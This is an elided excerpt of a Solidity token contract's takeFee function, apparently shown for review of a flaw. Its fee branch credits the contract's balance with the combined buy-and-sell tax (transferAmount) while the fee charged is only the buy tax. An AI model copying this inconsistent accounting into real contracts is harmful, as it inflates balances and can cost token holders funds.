...
contract COMP is Context, IERC20, Ownable {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        uint256 totalFeeTransfer = _totalTaxIfBuying.add(_totalTaxIfSelling);
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
            transferAmount = amount.mul(totalFeeTransfer).div(100);
        }
        ...
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(transferAmount);
